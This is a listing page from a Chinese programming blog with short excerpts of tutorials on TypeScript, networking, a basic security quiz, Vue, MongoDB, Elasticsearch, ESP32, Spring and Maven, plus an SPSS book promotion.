通过详细解析 TypeScript 模块的使用方法，我们的目标是帮助开发者更好地利用这一功能，促进代码的结构化和模块化。无论是对于初学者还是有经验的 TypeScript 程序员，这篇文章都提供了宝贵的指导和洞见，助你在 TypeScript 编程旅程中迈出坚实的一步。
本文不仅适合寻求加深对 TypeScript 模块概念理解的开发者，也适合那些希望通过优化代码结构来提高开发效率和代码质量的专业人士。加入我们，一起探索如何将 TypeScript 的模块化编程优势转化为实际的开发实力。
🌟一、引言 随着 JavaScript 的广泛应用，开发人员越来越关注代码质量、可读性和可维护性。为了解决这些问题，TypeScript 应运而生。它为 JavaScript 添加了更多的类型信息，使得代码更加清晰、简洁和可维护。
在 TypeScript 中，模块是一种组织代码的方法，它允许开发者将相关的类型和值分组在一起。模块可以避免命名冲突，提高代码的可读性和可维护性。
📚二、正文 1. 模块定义 使用 import 和 export 关键字声明模块。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d68673d8ba573fad3158ec936bb648fb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/732f961965827d0e3e3cd3c3d51faaaf/" rel="bookmark">
			网络安全小白进阶试题——附答案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		选择题（每题1分，共20分） 攻击者通过发送大量伪造的网络数据包，使目标网络资源不可用的攻击类型是？
A) PhishingB) DDoSC) SpoofingD) Malware 下列哪项是一种常见的社交工程攻击？
A) Firewall bypassB) Brute forceC) SQL injectionD) Phishing 以下哪项是一种多因素身份验证（MFA）的例子？
A) 只需用户名和密码B) 指纹扫描加密码C) 使用相同密码在不同网站登录D) 使用弱密码 什么是VPN的缩写？
A) Virtual Private NetworkB) Very Personal NetworkC) Verified Public NetworkD) Virtual Personal Network 以下哪种加密算法被广泛用于保护网页传输的数据？
A) MD5B) SHA-256C) AESD) RSA 哪个网络协议通常用于安全文件传输？
A) HTTPB) FTPC) SMTPD) DNS 在网络安全中，"Firewall" 的作用是？
A) 防止病毒传播B) 监控网络流量C) 阻止未经授权的访问D) 加密数据传输 下列哪项是一种针对软件漏洞的攻击？
A) RansomwareB) Cross-site scripting (XSS)C) Man-in-the-middle (MitM)D) Smishing 以下哪项是一种对称加密算法？
A) RSAB) ECCC) AESD) Diffie-Hellman 什么是零日漏洞？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/732f961965827d0e3e3cd3c3d51faaaf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/34af53f2f4a7e934bf50ee8550ce07bb/" rel="bookmark">
			计算机网络-OSI参考模型（来由 通信过程 各层分析）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 总览OSI模型怎么来的？OSI参考模型OSI参考模型解释通信过程各层分析应用层表示层会话层传输层网络层数据链路层物理层 小结 总览 两种网络分层结构
结合事实标准和法定标准得到一个中和版本5层的体系结构
OSI模型怎么来的？ 刚开始各个公司的网络体系结构不同，所以不能互通
所以ISO组织提出了这么一个模型，但由于与实际应用还是有点偏差，所以实际应用还是采用了TCP/IP模型
OSI参考模型 资源子网和通信子网相当于就是一个是对资源的加工处理，另一个是传输该资源的处理
OSI参考模型解释通信过程 中级系统只有三层
物理层对数据没啥添加，把数据形成比特流传送到传输介质上
中级系统接收到数据，然后各层依次还原查看信息
端到端：只有发送端会接收端有上面四层，所以可以直接看成上面四层是端到端直接相连的（因为只有传输过程只有一个处理到了上面四层，所以上面四层对应的连接也只有一个，类似路线中的出发点到终点）
点到点：每个都有下三层，所以这个不能作为指示一个发送端和接收端的独有的标志，所以看作是点到点的（类似说是路线中的一个节点到下一个节点）
每层会加上该层的控制信息（除了物理层）
数据链路层加两个部分
各层分析 应用层 用户与网络的界面
连上网才能使用的程序才属于应用层
表示层 两个通信系统就是接收端和发送端
呈现在屏幕上的方式
数据格式变化：如当图片的比特流自下而上传到表示层后，会将其转换为图片的数据格式
数据压缩和恢复：如将图片数据压缩传输到链路上，接收端接收到后解压缩或者恢复
会话层 建立连接的作用
会话之间彼此独立而不影响
如视频与对应的服务器的对话与百度与对应的服务器的对话之间不影响（视频按快进不会对百度有啥操作）
校验点：会话突然关闭，此时利用校验点恢复到之前的会话（如当传输大文件时候，如果突然中断，如果重传就浪费了之前传的部分了，利用校验点继续从之前的地方继续传）
传输层 上面四层都是端到端
下面三层都是是点到点
主机的进程用端口号来标记
文件切成一个一个报文段
可靠传输（大文件）：接收端有确认信息回复给发送端，没有收到就重发
不可靠传输（小文件）：没有确认机制
差错控制：报文端失序或者丢失
流量控制：速度匹配，使得发送和接收的速度匹配，控制发送端
复用与分用：多个进程可使用传输层，传输层可讲信息分给各个进程
网络层 路由选择：选择一条传输路线
流量控制：使得发送和接收的速度匹配，控制发送端
拥塞控制：即来不及接收分组（即数据报），会丢弃分组，此时网络阻塞，此时就需要某些控制来解决
数据链路层 成帧：帧也是比特流，数据报的组装
流量控制：使得发送和接收的速度匹配，控制发送端
访问控制： 在广播式网络中同一时间只能由一个来发送信息，其他都是监听状态，控制哪台主机占用当前的信道，信道与各个机器连接
物理层 把比特流转成电路信号，不需要对数据改动
透明传输：无视比特数据的组合，要将其传输在链路上
定义接口特性：如多少个插口，如何连接
定义传输模式：半双工（同一时间只能有一个人发送信息给对方，但可以是A到B也可以是B到A），双工（同一时间可以互相发送）单工（只有一种发送方向）
比特同步：如发送啥，接收放就能接收到啥
比特编码：如什么电压表示1，什么电压表示0
小结 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/19d9ec20919b189954250a29aa2723b1/" rel="bookmark">
			Xcode查看APP文件目录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、连接真机到MAC电脑上 二、打开Devices 点击window -&gt; Devices and Simulatores
三、选中设备、选择app 四、选择下载内容 五、查看文件内容 得到的文件
右键显示包内容，获得APP内数据
六、分发证书无法下载 使用分发的证书无法下载文件内容，需要APP是使用开发证书进行签名。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58b580ef1e4f15dbbe5b890340079975/" rel="bookmark">
			《SPSS统计学基础与实证研究应用精解》视频讲解：SPSS数据查找
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		《SPSS统计学基础与实证研究应用精解》4.4 视频讲解
视频为《SPSS统计学基础与实证研究应用精解》张甜 杨维忠著 清华大学出版社 一书的随书赠送视频讲解4.4节内容。本书已正式出版上市，当当、京东、淘宝等平台热销中，搜索书名即可。本书旨在手把手教会使用SPSS撰写实证研究类论文或开展数据分析。常用统计学原理、实证研究的套路、调查问卷设计、信度分析、效度分析、T检验、ANOVA分析、相关性分析、回归分析、中介效应、调节效应、因子分析、聚类分析……一应俱全。与本书配套的还有教学PPT和作者最新讲解的全套视频资料以辅助教学，力求实现最佳教学效果。
这儿我谈谈SPSS学习的分析。针对没有统计学基础的新手和小白，SPSS入门方面，建议一定边看书边操作，通过边学知识边上手操作的方式学习，会事半功倍，也有解决问题的成就感。推荐三本避雷避坑、亲测可行的网红图书，也是杨维忠、张甜老师撰写的SPSS三部曲：
1、《SPSS统计分析入门与应用精解(视频教学版)》杨维忠 张甜 清华大学出版社 2022年。侧重SPSS统计分析操作，体现在对于窗口选项设置和运行结果解读都非常全面、细致、到位；
2、《SPSS统计学基础与实证研究应用精解》张甜 杨维忠 清华大学出版社 2023年。为使用SPSS写作实证研究类论文所精心设计，实现零基础入门学会用SPSS写论文的目的。
3、《SPSS统计分析商用建模与综合案例精解》杨维忠 张甜 清华大学出版社 2021年。侧重使用SPSS开展数据挖掘、机器学习以及统计分析的综合应用。
《SPSS统计分析入门与应用精解（视频教学版）》杨维忠 张甜 编著 清华大学出版社。这是一本精解SPSS统计分析基础入门与应用的教材，山东大学陈强教授作序推荐，通过“精解统计分析原理、精解SPSS窗口选项设置、精解SPSS输出结果”三要素，帮助读者真正掌握常用统计分析软件SPSS的应用。适用于经济金融、管理、市场营销、教育学、心理学、医学等各类专业。
全书共14章。第1章为SPSS基础与应用操作概述；第2~7章介绍SPSS的基本统计分析方法，包括描述统计分析方法、比较平均值分析方法、非参数检验方法、相关分析方法、一般线性模型、各类常用回归分析方法等；第8~13章介绍SPSS的常用高级统计分析方法，包括时间序列预测方法、聚类分析方法、决策树分析与判别分析方法、生存分析方法、降维分析方法等；第14章为如何使用SPSS进行高质量综合性研究。每章有教学重点提示，章后有“知识点总结与练习题”，帮助读者增强学习效果，形成了“从基础原理到操作精解，从数据分析到案例应用”的完整教学闭环。与本书配套的还有教学PPT和作者新讲解的全套视频资料以辅助教学，力求实现最佳教学效果。
本书可作为经济学、管理学、统计学、金融学、社会学、医学、电子商务等相关专业的在校本、专科大学生及研究生学习、应用SPSS的主要教材，还可作为职场人士掌握SPSS应用、提升数据分析能力，进而提升工作效率、改善绩效水平的工具书。
如果是写论文使用SPSS，则推荐《SPSS统计学基础与实证研究应用精解》张甜 杨维忠著 清华大学出版社
《SPSS统计学基础与实证研究应用精解》张甜 杨维忠著 清华大学出版社
本书手把手教会使用SPSS撰写实证研究类论文或开展数据分析
常用统计学原理、实证研究的套路、调查问卷设计、信度分析、效度分析、T检验、ANOVA分析、相关性分析、回归分析、中介效应、调节效应、因子分析、聚类分析……一应俱全。
如果是使用SPSS开展数据挖掘、机器学习以及统计分析的综合应用，推荐《SPSS统计分析商用建模与综合案例精解》杨维忠 张甜编著 清华大学出版社 2021年 。国内众多高校作为核心专业课程教材。在51CTO举办的“2021年度最受读者喜爱的IT图书作者评选”中，《SPSS统计分析商用建模与综合案例精解》荣获“数据科学领域最受读者喜爱的图书TOP5”。
京东、当当、淘宝各大平台均在热销中，搜索书名即可。
创作不易，恳请大家多多点赞支持！也欢迎大家关注我，让我们一起学习Stata、SPSS、Python知识。多谢！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d589eb803ba40c97d01c038404f56017/" rel="bookmark">
			vue elementui table表格&#43;分页 删除末尾页唯一的一条数据后，页面自动跳转到上一页的js判断
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 vue elementui table表格+分页 删除末尾页唯一的一条数据后，页面自动跳转到上一页的js判断 this.$confirm('您确定要删除吗？', '提示', { confirmButtonText: '确定', cancelButtonText: '取消', type: 'warning', }) .then(() =&gt; { this.$axios.get('/admin/information/delete?id='+row.id).then((data) =&gt; { if (data.code == 200) { this.$message.success('操作成功！'); //逻辑判断开始 if (this.total !== 1) { //total总数 if (this.tableData.length === 1) {//tableData当前页数据 this.formSearch.pageNum = this.formSearch.pageNum - 1 //pageNum 页数 this.itemList() //重新调用获取数据 } else { this.itemList() } } else { this.tableData = [] } //逻辑判断结束 } else { this.$message.error(data.msg); } }); }) .catch(() =&gt; {}); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a12db8e027b6d3d2bf3db6e2a747d41d/" rel="bookmark">
			100天精通鸿蒙从入门到跳槽——第9天：TypeScript 知识储备：命名空间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		博主猫头虎的技术世界
🌟 欢迎来到猫头虎的博客 — 探索技术的无限可能！
专栏链接：
🔗 精选专栏：
《面试题大全》 — 面试准备的宝典！《IDEA开发秘籍》 — 提升你的IDEA技能！《100天精通Golang》 — Go语言学习之旅！《100天精通鸿蒙》 — 从Web/安卓到鸿蒙大师！ 100天精通鸿蒙OS（基础篇） 100天精通鸿蒙从入门到跳槽——第9天：TypeScript 知识储备：命名空间摘要引言🌈正文🔍1. 命名空间定义📈2. 作用域🔍3. 命名空间的作用🛡️4. 命名空间与模块结合📦 总结🎯参考资料📚 100天精通鸿蒙从入门到跳槽——第9天：TypeScript 知识储备：命名空间 摘要 🌟 在 TypeScript 的编程世界中，命名空间扮演着关键角色。🚀 命名空间的高效应用是本文的核心，旨在为开发者提供一种精致的代码组织方式。我们深入探讨了 TypeScript 中命名空间的定义、作用域及其功能，揭示了如何通过使用命名空间来优化代码结构，从而提升代码的可读性、可维护性和整体性能。本文是 TypeScript 开发者的宝贵资源，帮助您在开发高效、安全且可靠的应用程序中更上一层楼。👨‍💻🚀
引言🌈 在数字化时代，JavaScript 的应用变得越来越广泛，而 TypeScript 的出现🌈 对于提高代码质量和可维护性起到了革命性作用。TypeScript 不仅在 JavaScript 的基础上添加了类型信息，而且通过其独特的特性，如 命名空间，大大增强了代码的清晰度和组织性。本文将深入探讨 TypeScript 中命名空间的重要性和应用，揭示如何利用这一强大特性来创建更加高效和可维护的代码结构。🔍📈
正文🔍 1. 命名空间定义📈 🌐 在 TypeScript 中，使用 namespace 关键字来声明命名空间，构建代码的小型生态系统。
namespace MyNamespace { const myVariable = "猫头虎"; function myFunction(): void { console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a12db8e027b6d3d2bf3db6e2a747d41d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad763088106267fcf7931af710313d64/" rel="bookmark">
			WEB前端IDE的使用以及CSS的应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		IDE的使用 &lt;!DOCTYPE html&gt; &lt;html lang="zh"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;ol&gt; &lt;!-- emmet命令 *符号可以指定生成几个子项 --&gt; &lt;!-- []中填写标签的属性 --&gt; &lt;!-- {}中填写内容 --&gt; &lt;!-- ctrl + k 可以将代码进行格式化处理--&gt; &lt;!-- ctrl + s 可以保存代码 --&gt; &lt;li style="border:1px solid red"&gt;子项1&lt;/li&gt; &lt;li style="border:1px solid red"&gt;子项2&lt;/li&gt; &lt;li style="border:1px solid red"&gt;子项3&lt;/li&gt; &lt;li style="border:1px solid red"&gt;子项4&lt;/li&gt; &lt;li style="border:1px solid red"&gt;子项5&lt;/li&gt; &lt;li style="border:1px solid red"&gt;子项6&lt;/li&gt; &lt;li style="border:1px solid red"&gt;子项7&lt;/li&gt; &lt;li style="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ad763088106267fcf7931af710313d64/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a50bd9ad44f3eac28217656624923da/" rel="bookmark">
			mongo：查找一个值find_one并排序sort
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 错误写法
mongo.db['records'].find_one({}).sort([('_id', -1)]) 正确写法
mongo.db['records'].find_one({}, sort=[('_id', -1)]) 参考
Python mongodb find_one() sort() AttributeError: ‘dict’ object has no attribute ‘sort’ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d05f69b99d45fe6c7154d3f9f85d9f96/" rel="bookmark">
			three.js从入门到精通系列教程043 - 创建行星按行星轨道围绕太阳公转
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;three.js从入门到精通系列教程043 - 创建行星按行星轨道围绕太阳公转&lt;/title&gt; &lt;script src="ThreeJS/three.js"&gt;&lt;/script&gt; &lt;script src="ThreeJS/jquery.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;center id="myContainer"&gt;&lt;/center&gt; &lt;script&gt; //创建渲染器 var myRenderer = new THREE.WebGLRenderer({ antialias: true }); myRenderer.setSize(window.innerWidth, window.innerHeight); myRenderer.setClearColor('black', 1.0); $("#myContainer").append(myRenderer.domElement); var myCamera = new THREE.PerspectiveCamera(20, window.innerWidth / window.innerHeight, 1, 1000); myCamera.position.set(0, 0, 400); var myScene = new THREE.Scene(); var myMap = THREE.ImageUtils.loadTexture("images/img052.jpg"); myScene.background = myMap; //创建旋转系统 var myRotation = { x: -Math.PI * 0.42, y: Math.PI * 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d05f69b99d45fe6c7154d3f9f85d9f96/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b8835e5401770d22cf089602b0a4799/" rel="bookmark">
			家政小程序：重新定义家政服务
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着科技的不断进步，小程序已成为日常生活的一部分，特别是在家政服务领域。家政小程序，作为连接家政服务提供者和消费者的重要桥梁，不仅简化了服务流程，提高了服务质量，还为双方带来了前所未有的便利。
一、家政小程序的优势
1. 便利性：家政小程序通过手机端操作，方便快捷。用户只需在手机上轻轻一点，便可预约服务、查看服务状态等，无需下载安装其他应用。
2. 高效性：家政小程序具有强大的后台管理系统，能够实时更新服务状态，确保服务的及时性。同时，智能匹配功能可快速匹配合适的服务人员，大大提高了服务效率。
3. 安全性：家政小程序采用实名认证制度，确保服务人员身份的真实性。同时，用户可以通过小程序对服务进行评价和反馈，保障了服务的品质。
二、家政小程序的多样化功能
1. 服务预约：用户可在小程序上预约所需的清洁、看护、照料等家政服务。同时，用户可根据自身需求选择不同的服务等级和服务人员。
2. 在线支付：用户可通过小程序完成服务的在线支付，方便快捷。同时，平台会为消费者提供保障，确保资金安全。
3. 服务评价：用户可对已完成的服务进行评价和反馈，帮助其他用户做出选择，同时也为平台优化服务提供了依据。
4. 社区交流：小程序内设社区功能，用户可在社区内交流心得、分享经验，增加互动性。
三、家政小程序的未来展望
随着人工智能、大数据等技术的不断发展，家政小程序将有更多创新应用。例如，通过数据分析，平台可为用户提供更个性化的服务推荐；利用人工智能技术，可实现智能客服等功能，进一步提升用户体验。
综上所述，家政小程序作为一种新型的家政服务模式，以其便利性、高效性和安全性等特点，正逐渐改变传统的家政服务方式。未来，随着技术的不断创新和应用，家政小程序将为家政服务行业带来更多可能性，为消费者提供更优质的服务体验。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21ab086f0089216ae802e7d4eb1d0fb6/" rel="bookmark">
			Elasticsearch基础篇(八)：常用查询以及使用Java Api Client进行检索
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ES常用查询以及使用Java Api Client进行检索 1. 检索需求 参照豆瓣阅读的列表页面
需求：
检索词需要在数据库中的题名、作者和摘要字段进行检索并进行高亮标红返回的检索结果需要根据综合、热度最高、最近更新、销量最高、好评最多进行排序分页数量为10，并且返回检索到的总数量 2. 建立测试环境 2.1 根据需求建立es字段 mapping.json
{ "mappings": { "properties": { "title": { "analyzer": "standard", "type": "text" }, "author": { "analyzer": "standard", "type": "text", "fields": { "keyword": { "type": "keyword" } } }, "contentDesc": { "analyzer": "standard", "type": "text" }, "wordCount": { "type": "double" }, "price": { "type": "double" }, "cover": { "type": "keyword" }, "heatCount": { "type": "integer" }, "updateTime": { "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/21ab086f0089216ae802e7d4eb1d0fb6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2ef585b3f370128184bbb98b9067561/" rel="bookmark">
			python抽奖小程序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 import random import keyboard import time def make_choice(): while True: choice_selected = random.choices(['乾', '坤', '坎', '离', '兑', '震', '巽', '艮'])[0] print(choice_selected, end='\r') # time.sleep(0.1) if keyboard.is_pressed('enter'): return choice_selected if __name__ == '__main__': print("抽奖开始！！！") choice_selected = make_choice() print('选项是：', choice_selected) print("搞起来吧，骚年！！！！！！") 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aff5c827a7cbaf319d260b602576ce2c/" rel="bookmark">
			Arduino ESP32 USB CDC功能使用介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Arduino ESP32 USB CDC功能使用介绍 📌有关USB CDC原文档介绍：https://espressif-docs.readthedocs-hosted.com/projects/arduino-esp32/en/latest/api/usb_cdc.html📍有关ESP32-S/C 系列 USB 外设介绍详情页：https://espressif-docs.readthedocs-hosted.com/projects/espressif-esp-iot-solution/zh-cn/latest/usb/usb_overview.html ✨在Arduino IDE开发环境下，ESP32 USB CDC功能是通过Arduino IDE面板上的功能菜单，配置选项完成设置的。例如：
✨在VSCode PIO环境下，需要在platformio.ini文件中，添加相应的参数.例如： build_flags = -DARDUINO_USB_MODE=1 -DARDUINO_USB_CDC_ON_BOOT=1 🔱USB CDC相关的API函数大部分属于Stream类，和Serial、WiFiClient使用方法类似。🌿如果只是使用USB CDC作为调试串口，那么仅需要使能USB CDC On Boot选项即可（该选项配置为Disabled,则在代码中如果使用Serial.begin()则选择的是硬件串口0） 🌼USB CDC 和硬件串口0数据相互转发测试例程 🏷测试对象：ESP32s3🔧Arduno IDE 选项配置：USB CDC On Boot必须使能，和USB Mode设置：USB-OTG🔖在例程中同时使用了硬件串口0和USB CDC串口功能。
✨需要注意，本程序中，USB CDC接收数据的处理，是在相应的事件回调中处理，而不是在loop()循环中处理。 /* ESP32 USB CDC介绍文档： https://espressif-docs.readthedocs-hosted.com/projects/arduino-esp32/en/latest/api/usb_cdc.html */ #ifndef ARDUINO_USB_MODE #error This ESP32 SoC has no Native USB interface #elif ARDUINO_USB_MODE == 1 #warning This sketch should be used when USB is in OTG mode void setup() {} void loop() {} #else #include "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aff5c827a7cbaf319d260b602576ce2c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54c76360924b9749ca039f1e8484acc9/" rel="bookmark">
			键盘的基础知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		键盘，作为我们日常生活中不可或缺的输入设备，它在我们与电子设备之间的交互中起到了关键的作用。无论是办公、学习还是娱乐，我们都需要通过键盘来输入文字、数字和命令。然而，键盘的构造和工作原理可能并不像我们所想的那样简单。这篇文章将深入探讨键盘的基础知识，包括其发展历程、分类、工作原理以及如何选择一款适合自己的键盘。通过了解这些基础知识，我们不仅能更好地理解和使用键盘，还能在挑选键盘时做出更明智的选择。让我们一起揭开键盘的神秘面纱，探索其背后的科学原理和设计智慧。
联想知识库https://iknow.lenovo.com.cn/detail/024380
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e22ea8f8170443e02cce9b5cd4eead66/" rel="bookmark">
			2024-01-19（SpringCloud&amp;ThreadLocal）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.Seata的TC服务注册到Nacos注册中心当中 2.Seata为我们提供了AT，TCC，SAGA，XA事务解决方案。 3.XA规范是一种分布式事务处理标准，XA规范描述了全局的TM与局部的RM之间的接口，几乎所有的主流的数据库都对XA规范提供了支持。Seata的XA模式如下： 上述Seata的XA规范保证分布式事务的执行流程（分为两阶段）：
一阶段工作：
① RM注册分支事务到TC
② RM执行分支业务sql但不提交
③ RM报告执行状态到TC
二阶段工作：
① TC检测各分支事务执行状态
a. 如果都成功，通知所有RM提交事务
b. 如果有失败的分支事务，通知所有RM回滚事务
② RM接受TC指令，提交or回滚事务。
XA规范存在的问题：
1）执行速度慢，因为要等待所有分支事务执行完成，这个过程效率比较低。
2）另外，XA规范基于openFeign来进行网络接口调用，并且是串行调用，所以第一个执行的分支事务会等待后续的分支事务执行完毕很长时间。
3）依赖关系数据库，注入redis类型数据库不支持。
4.Springboot中Seater的XA模式采用starter做了很好的依赖封装，因此使用的时候只需要引入starter依赖，并在application.yml文件中写好配置（微服务的话在nacos的配置中心中配置），然后在给发起全局事务的入口方法添加@GlobalTransactional注解就可以使用了。 5.AT模式： Seata主推的是AT模式，AT模式同样是分阶段提交的事务类型，不过弥补了XA模式中资源锁定周期过长的缺陷。
6.Seata中AT模式的执行流程： 一阶段RM的工作：
1）注册分支事务
2）记录undo-log（数据快照）
3）执行业务sql并提交
4）报告事务状态
二阶段提交（执行成功不需要回滚）时RM的工作：
1）删除undo-log即可。
二阶段回滚（执行不成功需要回滚）时RM的工作：
1）根据undo-log恢复数据到更新前即可。
流程：
7.分布式事务是存在于面试当中的技术，解决分布式事务最好的方案就是最好不要出现分布式事务。 ---------------------------------------------------------------------------------------------------------------------------------
8.ThreadLocal： set()：将变量绑定到当前线程当中
get()：获取当前线程绑定的变量
9.ThreadLocal和sychronized关键字的区别： synchronized采用时间换取空间的方式，只提供了一份变量，让不同的线程排队访问，它侧重于多个线程之间访问资源的同步；ThreadLocal采用空间换取时间的方式，为每一个线程都提供了一份变量的副本，从而实现同时访问而不互相干扰，它侧重于多线程中让每个线程之间的数据相互隔离。
10.ThreadLocal方案的好处： 在一些特定场景下具有以下两方面的优势：1.传递数据：保存每个线程所绑定的数据，在需要的地方可以直接获取，避免参数直接传递所带来的代码耦合问题；2.线程隔离：各线程之间的数据相互隔离却又具备并发性，避免同步方式带来的性能损失。
11.ThreadLocal的设计： JDK8的设计方案的两个好处：
1）每个Map存储的Entry数量减少
2）当Thread销毁的时候,，ThreadLocalMap也会随之销毁，减少内存的使用
12.11是ThreadLocal的内部结构，下面是ThreadLocal的核心方法，除了构造方法之外，ThreadLocal对外暴露的方法有以下四个：
protected T initialValue(); //返回当前线程局部变量的初始值 public void set(T value); //设置当前线程绑定的局部变量 public T get(); //获取当前线程绑定的局部变量 public void remove(); //移除当前线程绑定的局部变量 set()方法源码步骤：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e22ea8f8170443e02cce9b5cd4eead66/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/486363ad64123ae0bac348843eff356b/" rel="bookmark">
			基于 IDEA 进行 Maven 工程构建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 构建概念和构建过程 项目构建是指将源代码、依赖库和资源文件等转换成可执行或可部署的应用程序的过程，在这个过程中包括编译源代码、链接依赖库、打包和部署等多个步骤。
项目构建是软件开发过程中至关重要的一部分，它能够大大提高软件开发效率，使得开发人员能够更加专注于应用程序的开发和维护，而不必关心应用程序的构建细节。
同时，项目构建还能够将多个开发人员的代码汇合到一起，并能够自动化项目的构建和部署，大大降低了项目的出错风险和提高开发效率。常见的构建工具包括 Maven、Gradle、Ant 等。
2. 命令方式项目构建 命令描述mvn compile编译项目，生成target文件 （java 类编译为字节码文件）mvn package打包项目，生成jar或war文件mvn clean清理编译或打包后的项目结构mvn install打包后上传到maven本地仓库mvn deploy只打包，上传到maven私服仓库mvn site生成站点mvn test执行测试源码 2.1 mvn compile 现在 java 工程中创建一个 User 类
这里需要有 get、set 、toString 等方法，需要用到 lombok 这个 jar 包，来自动实现这些方法
访问 jar 包查询网站： https://mvnrepository.com/
搜索 lombok
选择一个使用较多的版本即可
将依赖放置在当前 java 工程的 pom.xml 中，刷新 maven
使用 lombok 的注解
@data：生成 get、set、toString 等方法
@AllArgsConstructor：生成有参构造方法
@NoArgsConstructor：生成无参构造
@Getter、@Setter：用于产生 get、set 方法
由于是通过命令行来执行，首先右键打开工程所在文件夹
进入到当前工程
mvn 相关的命令必须在 pom.xml 目录下使用，在地址栏输入 cmd 回车
从而直接定位到当前目录
这是由于利用 jenv 进行 JDK 版本管理时，在更换路径后，此路径没有 JDK 版本
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/486363ad64123ae0bac348843eff356b/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/9/">«</a>
	<span class="pagination__item pagination__item--current">10/321</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/11/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>